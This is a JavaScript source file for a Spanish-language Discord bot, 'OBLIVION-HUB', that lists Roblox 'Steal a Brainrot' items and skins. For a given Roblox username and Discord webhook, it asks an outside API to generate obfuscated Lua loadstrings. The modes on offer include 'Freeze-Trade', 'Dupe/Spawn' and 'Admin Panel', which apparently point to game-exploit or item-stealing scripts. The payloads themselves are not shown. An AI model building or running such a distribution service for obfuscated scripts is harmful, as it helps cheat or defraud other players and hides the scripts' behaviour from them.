const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');

// ============================================================
//  CONFIGURACIÓN DE ENTORNO
// ============================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const API_URL = process.env.API_URL || 'https://oblivionhub.xyz';

// ============================================================
//  LISTAS DE BRAINROTS (SOLO SECRET Y OG)
// ============================================================
const BRAINROTS_SECRET = [
    '1x1x1x1', '25', '67', 'Abyssaloco', 'Agarrini la Palini', 'Antonio',
    'Aquarino', 'Arcadopus', 'Arcadragon', 'Bacuru and Egguru', 'Bananito',
    'Baskito', 'Bearito Cabinito', 'Berryno', 'Bisonte Giuppitere',
    'Blackhole Goat', 'Boatito Auratito', 'Bombardiro Vaccariro', 'Boppin Bunny',
    'Brunito Marsito', 'Buho de Volto', 'Bunito Bunito Spinito',
    'Bunny Bunny Bunny Sahur', 'Bunny and Eggy', 'Bunnyman', 'Buntteo',
    'Burguro And Fryuro', 'Burrito Bandito', 'Camera Ramena', 'Capitano Gullini',
    'Capitano Moby', 'Cash or Card', 'Caylusaurus', 'Celestial Pegasus',
    'Celularcini Viciosini', 'Cerberus', 'Chachechi', 'Chicleteira Bicicleteira',
    'Chicleteira Cupideira', 'Chicleteira Noelteira', 'Chicleteira Surfeiteira',
    'Chicleteirina Bicicleteirina', 'Chill Puppy', 'Chillin Chili', 'Chimnino',
    'Chipso and Queso', 'Churrito Bunnito', 'Cigno Fulgoro', 'Cloverat Clapat',
    'Coco and Mango', 'Cooki and Milki', 'Craburger', 'Cuadramat and Pakrahmatmamat',
    'Cupid Cupid Sahur', 'Cupid Hotspot', 'DJ Panda', 'Digi Narwhal',
    'Donkeyturbo Express', 'Dragon Aquanini', 'Dragon Cannelloni',
    'Dragon Gingerini', 'Dug dug dug', 'Duggy Bros', 'Dul Dul Dul',
    'Easter Easter Easter Sahur', 'Eid Eid Eid Sahur', 'Elefanto Frigo',
    'Esok Sekolah', 'Eviledon', 'Extinct Matteo', 'Extinct Tralalero',
    'Festive 67', 'Fishboard', 'Fishino Clownino', 'Flancito', 'Flipa Sandala',
    'Fortunu and Cashuru', 'Foxini Lanternini', 'Fragola La La La',
    'Fragrama and Chocrama', 'Frankentteo', 'Frullato Framingo', 'Futbolini Skatini',
    'GOAT', 'Garama and Madundung', 'Gelato Lumacho', 'Giftini Spyderini',
    'Ginger Gerat', 'Girafini Raftini', 'Glaciator', 'Globa Steppa',
    'Gobblino Uniciclino', 'Gold Egg', 'Gold Elf', 'Gold Gold Gold',
    'Graipuss Medussi', 'Granny', 'Granny', 'Griffin', 'Guerriro Digitale',
    'Guest 666', 'Gym Bros', 'Ho Ho Ho Sahur', 'Hopilikalika Hopilikalako',
    'Horegini Boom', 'Hydra Bunny', 'Hydra Dragon Cannelloni', 'Jackorilla',
    'Jelly Moby', 'Job Job Job Sahur', 'John Doe', 'Jolly Jolly Sahur',
    'Kalika Bros', 'Karker Sahur', 'Karkerkar Kurkur', 'Ketchuru and Musturu',
    'Ketupat Bros', 'Ketupat Kepat', 'Kraken', 'La Anniversary Grande',
    'La Casa Boo', 'La Cucaracha', 'La Easter Grande', 'La Extinct Grande',
    'La Food Combinasion', 'La Ginger Sekolah', 'La Grande Combinasion',
    'La Jolly Grande', 'La Karkerkar Combinasion', 'La Lucky Grande',
    'La Romantic Grande', 'La Sahur Combinasion', 'La Secret Combinasion',
    'La Spooky Grande', 'La Summer Grande', 'La Supreme Combinasion',
    'La Taco Combinasion', 'La Vacca Jacko Linterino', 'La Vacca Lepre Lepreino',
    'La Vacca Prese Presente', 'La Vacca Saturno Saturnita', 'Las Sis',
    'Las Tralaleritas', 'Las Vaquitas Saturnitas', 'Lavadorito Spinito',
    'List List List Sahur', 'Los 25', 'Los 67', 'Los Amigos', 'Los Bros',
    'Los Bunitos', 'Los Burritos', 'Los Candies', 'Los Chicleteiras',
    'Los Chillis', 'Los Combinasionas', 'Los Cucarachas', 'Los Cupids',
    'Los Fruits', 'Los Hackers', 'Los Hotspotsitos', 'Los Jobcitos',
    'Los Jolly Combinasionas', 'Los Karkeritos', 'Los Mariachis', 'Los Matteos',
    'Los Mi Gatitos', 'Los Mobilis', 'Los Nooo My Hotspotsitos', 'Los Planitos',
    'Los Primos', 'Los Puggies', 'Los Quesadillas', 'Los Sekolahs',
    'Los Spaghettis', 'Los Spooky Combinasionas', 'Los Spyderinis',
    'Los Sweethearts', 'Los Tacoritas', 'Los Tortus', 'Los Tralaleritos',
    'Los Trios', 'Love Love Bear', 'Love Love Love Sahur', 'Lovin Rose',
    'Luck Luck Luck Sahur', 'Lucky Block', 'Mariachi Corazoni', 'Mi Gatito',
    'Mieteteira Bicicleteira', 'Money Money Bros', 'Money Money Puggy',
    'Money Money Reindeer', 'Nacho Spyder', 'Naughty Naughty', 'Noo my Candy',
    'Noo my Eggs', 'Noo my Gold', 'Noo my Heart', 'Noo my Present',
    'Noo my examine', 'Nooo My Hotspot', 'Nuclearo Dinossauro', 'Octoball',
    'Ombrello Topolino', 'Orcaledon', 'Pancake and Syrup', 'Paradiso Axolottino',
    'Perrito Burrito', 'Pirulitoita Bicicleteira', 'Please my Present',
    'Popcuru and Fizzuru', 'Pot Hotspot', 'Pot Pumpkin', 'Pumpkini Spyderini',
    'Quackini Snackini', 'Quesadilla Crocodila', 'Quesadillo Vampiro',
    'Rang Ring Bus', 'Reindeer Tralala', 'Reinito Sleighito', 'Rico Dinero',
    'Rocco Disco', 'Rocketini Frostini', 'Rosetti Tualetti', 'Rosey and Teddy',
    'Rubrikiko', 'Sammyni Cakini', 'Sammyni Fattini', 'Sammyni Spyderini',
    'Sand Sand Sand', 'Santa Hotspot', 'Santteo', 'Serafinna Medusella',
    'Signore Carapace', 'Snailo Clovero', 'Spaghetti Tualetti', 'Spinny Hammy',
    'Spooky and Pumpky', 'Steakini Fattini', 'Strawberrita', 'Sushi Inu',
    'Swag Soda', 'Swaggy Bros', 'Tacorillo Crocodillo', 'Tacorita Bicicleta',
    'Tang Tang Keletang', 'Telemorte', 'Tictac Sahur', 'Tirilikalika Tirilikalako',
    'To to to Sahur', 'Torrtuginni Dragonfrutini', 'Tralaledon',
    'Trenostruzzo Turbo 4000', 'Trickolino', 'Triplito Tralaleritos',
    'Tuff Toucan', 'Ventoliero Pavonero', 'Venuspino', 'Vulturino Skeletono',
    'W or L', 'Yess my examine', 'Zombie Tralala', '4th Bros', 'Capitano Americano', 
    'Bufalino Boomberino', 'Esok Goala', 'Los Tangcitos', 'Los Tictacs', 'Los Admins', 'Moby Bros', 'Var Var Var'
];

const BRAINROTS_OG = [
    'Headless Horseman', 'John Pork', 'Meowl', 'Skibidi Toilet',
    'Spyder Elephant', 'Strawberry Elephant'
];

// ============================================================
//  LISTAS DE SKINS Y GEARS (TODAS)
// ============================================================
const SKIN_ITEMS = [
    'Rose', 'Gingerbread', 'Halloween', 'Christmas', 'Bunny Basket',
    'Summer', 'Pot of Gold', 'Taco', 'Octo', 'Valentines',
    'Easter', 'Lucky', 'Aquatic'
];

const GEAR_ITEMS = [
    "Santa's Sleigh", "Cupid's Wings", "Witch's Broom", "Waverider",
    "Yin Yang Slap", "Cursed Slap", "Cyber Slap", "Divine Slap",
    "Bloodmoon Slap", "Radioactive Slap", "Rainbow Slap",
    "Rainbow Hammer", "Bloodmoon Hammer", "Radioactive Airstrike",
    "Yin Yang Lamp", "Demon's Head", "Lava Slap", "Lava Blaster",
    "Alien Slap", "Blackhole Bomb", "Candy Sentry"
];

// ============================================================
//  CLIENTE DE DISCORD
// ============================================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ============================================================
//  DEFINICIÓN DE COMANDOS SLASH
// ============================================================
const commands = [
    new SlashCommandBuilder()
        .setName('generate')
        .setDescription('Genera un script de OBLIVION con tus selecciones')
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Tu Roblox username')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Tu Discord webhook (opcional)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('mode')
                .setDescription('Modo de ejecución')
                .setRequired(false)
                .addChoices(
                    { name: 'Normal', value: 'normal' },
                    { name: 'Admin Panel', value: 'adminpanel' },
                    { name: 'Freeze-Trade', value: 'freezetrade' },
                    { name: 'Dupe/Spawn', value: 'dupespawn' },
                    { name: 'Custom', value: 'custom' }
                ))
        .addStringOption(option =>
            option.setName('brainrots')
                .setDescription('Preselección de brainrots')
                .setRequired(false)
                .addChoices(
                    { name: 'Secret', value: 'secret' },
                    { name: 'OG', value: 'og' },
                    { name: 'ALL (Secret + OG)', value: 'all' }
                ))
        .addStringOption(option =>
            option.setName('skins')
                .setDescription('Skins a incluir')
                .setRequired(false)
                .addChoices(
                    { name: 'ALL', value: 'all' }
                ))
        .addStringOption(option =>
            option.setName('gears')
                .setDescription('Gears a incluir')
                .setRequired(false)
                .addChoices(
                    { name: 'ALL', value: 'all' }
                ))
        .addStringOption(option =>
            option.setName('custom_code')
                .setDescription('Código personalizado (solo si modo Custom)')
                .setRequired(false))
        .addBooleanOption(option =>
            option.setName('obfuscate')
                .setDescription('¿Ofuscar el script? (si falla, se sube sin ofuscar)')
                .setRequired(false)),

    new SlashCommandBuilder()
        .setName('help')
        .setDescription('Muestra la ayuda de OBLIVION-HUB'),

    new SlashCommandBuilder()
        .setName('webhook')
        .setDescription('Guarda tu webhook para usarlo siempre')
        .addStringOption(option =>
            option.setName('url')
                .setDescription('URL del webhook de Discord')
                .setRequired(true)),

    new SlashCommandBuilder()
        .setName('paste')
        .setDescription('Crea un paste de texto en OBLIVION-HUB')
        .addStringOption(option =>
            option.setName('content')
                .setDescription('El contenido del paste')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('title')
                .setDescription('Título del paste (opcional)')
                .setRequired(false))
        .addBooleanOption(option =>
            option.setName('public')
                .setDescription('¿Público o solo visible para ti?')
                .setRequired(false))
];

// ============================================================
//  REGISTRO DE COMANDOS
// ============================================================
const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
    console.log(`✅ Bot conectado como ${client.user.tag}`);
    try {
        await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), {
            body: commands.map(cmd => cmd.toJSON())
        });
        console.log('✅ Comandos registrados correctamente en el servidor.');
    } catch (error) {
        console.error('❌ Error registrando comandos:', error);
    }
});

// ============================================================
//  MANEJADOR DE INTERACCIONES
// ============================================================
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, user, options } = interaction;

    if (commandName === 'help') {
        const embed = new EmbedBuilder()
            .setTitle('🟥 OBLIVION-HUB Bot')
            .setDescription('Genera scripts de Roblox directamente desde Discord')
            .setColor('#DC2626')
            .addFields(
                { name: '/generate', value: 'Genera un script con presets\n`/generate username:... brainrots:secret skins:all gears:all obfuscate:true`', inline: false },
                { name: '/webhook', value: 'Guarda tu webhook para usarlo siempre', inline: false },
                { name: '/paste', value: 'Crea un paste de texto en OBLIVION-HUB', inline: false },
                { name: '/help', value: 'Muestra esta ayuda', inline: false }
            )
            .setFooter({ text: 'OBLIVION-HUB © 2026' });
        await interaction.reply({ embeds: [embed], ephemeral: true });
        return;
    }

    if (commandName === 'webhook') {
        const url = options.getString('url');
        if (!client.userWebhooks) {
            client.userWebhooks = new Map();
        }
        client.userWebhooks.set(user.id, url);
        await interaction.reply({
            content: `✅ Webhook guardado correctamente. Ahora puedes usar \`/generate\` sin especificar webhook.`,
            ephemeral: true
        });
        return;
    }

    if (commandName === 'paste') {
        await interaction.deferReply({ ephemeral: false });

        const content = options.getString('content');
        const title = options.getString('title') || 'Untitled';
        const isPublic = options.getBoolean('public') || false;

        try {
            const response = await fetch(`${API_URL}/api/paste`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content,
                    title,
                    userId: isPublic ? null : user.id,
                    public: isPublic
                })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error || 'Error al crear el paste');
            }

            await interaction.editReply({
                content: `✅ **Paste creado!**\n🔗 ${data.url}\n📌 Título: ${data.title}\n🔒 ${isPublic ? 'Público' : 'Privado (solo tú puedes verlo)'}`
            });

        } catch (error) {
            await interaction.editReply({ content: `❌ Error al crear el paste: ${error.message}` });
        }
        return;
    }

    if (commandName === 'generate') {
        await interaction.deferReply({ ephemeral: false });

        try {
            const username = options.getString('username');
            let webhook = options.getString('webhook') || '';
            const mode = options.getString('mode') || 'normal';
            const brainrotPreset = options.getString('brainrots') || null;
            const skinsOption = options.getString('skins') || null;
            const gearsOption = options.getString('gears') || null;
            const customCode = options.getString('custom_code') || '';
            const obfuscate = options.getBoolean('obfuscate') || false;

            if (!webhook && client.userWebhooks?.has(user.id)) {
                webhook = client.userWebhooks.get(user.id);
            }

            let brainrots = [];
            if (brainrotPreset === 'secret') {
                brainrots = BRAINROTS_SECRET;
            } else if (brainrotPreset === 'og') {
                brainrots = BRAINROTS_OG;
            } else if (brainrotPreset === 'all') {
                brainrots = [...BRAINROTS_SECRET, ...BRAINROTS_OG];
            } else {
                brainrots = [];
            }

            let skins = [];
            let gears = [];

            if (skinsOption === 'all') {
                skins = SKIN_ITEMS;
            }

            if (gearsOption === 'all') {
                gears = GEAR_ITEMS;
            }

            const response = await fetch(`${API_URL}/api/generate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username,
                    webhook,
                    mode,
                    brainrots,
                    skins,
                    gears,
                    customCode,
                    shortEnabled: obfuscate,
                    userId: user.id
                })
            });

            const contentType = response.headers.get('content-type');
            if (!contentType || !contentType.includes('application/json')) {
                const text = await response.text();
                throw new Error(`La API devolvió HTML/Texto en lugar de JSON. Respuesta: ${text.substring(0, 100)}...`);
            }

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error || 'Error en la API');
            }

            // SIEMPRE mostrar el loadstring (porque ahora siempre se sube a pastefy)
            if (data.loadstring) {
                const status = data.obfuscated ? 'ofuscado' : 'generado';
                let message = `📄 **Script ${status} para ${username}**\n\`\`\`lua\n${data.loadstring}\n\`\`\``;
                if (data.warning) {
                    message += `\n⚠️ *Nota: ${data.warning}*`;
                }
                await interaction.editReply({ content: message });
                return;
            }

            // Fallback: si no hay loadstring, mostrar el script completo
            const script = data.script || 'No se pudo generar el script.';

            if (script.length > 1900) {
                const parts = script.match(/[\s\S]{1,1900}/g) || [];
                await interaction.editReply(`📄 **Script generado para ${username}** (muy largo, enviado en partes):`);
                for (const part of parts) {
                    await interaction.followUp({ content: `\`\`\`lua\n${part}\n\`\`\`` });
                }
            } else {
                await interaction.editReply({
                    content: `📄 **Script generado para ${username}**\n\`\`\`lua\n${script}\n\`\`\``
                });
            }

        } catch (error) {
            await interaction.editReply({ content: `❌ Error al generar el script: ${error.message}` });
        }
        return;
    }
});

// ============================================================
//  INICIAR EL BOT
// ============================================================
client.login(TOKEN);

// ============================================================
//  SERVIDOR HTTP PARA MANTENER EL WEB SERVICE ACTIVO
// ============================================================
const app = express();
const port = process.env.PORT || 10000;

app.get('/', (req, res) => {
    res.send('🤖 OBLIVION-HUB Bot está funcionando correctamente.');
});

app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Servidor HTTP escuchando en el puerto ${port}`);
});
